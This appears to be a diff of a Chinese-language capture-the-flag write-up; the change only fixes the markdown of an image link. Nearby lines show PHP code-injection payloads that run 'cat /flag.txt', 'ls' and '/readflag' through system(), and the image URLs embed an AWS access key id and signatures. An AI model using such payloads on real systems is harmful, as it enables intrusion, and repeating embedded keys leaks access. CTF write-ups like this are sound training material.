@@ -24,7 +24,7 @@ echo "valid";
 
 4. 我們繼續讀檔，可以找到根目錄有一個`flag.txt`，嘗試：`;}system(%27cat /flag.txt%27);/*`，但卻讀不到。
 5. 再以`;}system(%27ls -al /flag.txt%27);/*`查看，必須要`root`權限才能讀。
-    - ![image]([https://hackmd.io/_uploads/r1MKC3Io0.png](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e8fd903bda08dfca73dc8f480a9620bc.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1726823919&Signature=N%2B89PaX%2FjEBHfkMNKX5bQWE0QbA%3D))
+    - ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e8fd903bda08dfca73dc8f480a9620bc.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1726823919&Signature=N%2B89PaX%2FjEBHfkMNKX5bQWE0QbA%3D)
 6. 但發現根目錄底下也有一個編譯後的檔案：`/readflag`
 7. 嘗試執行：`;}system(%27/readflag%27);/*`
     - ![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_6ea7ad158bcce2debdcc761cd7a6a35b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1726823888&Signature=RIht%2Bj73kWGJJqazFEGwfUqXA08%3D)
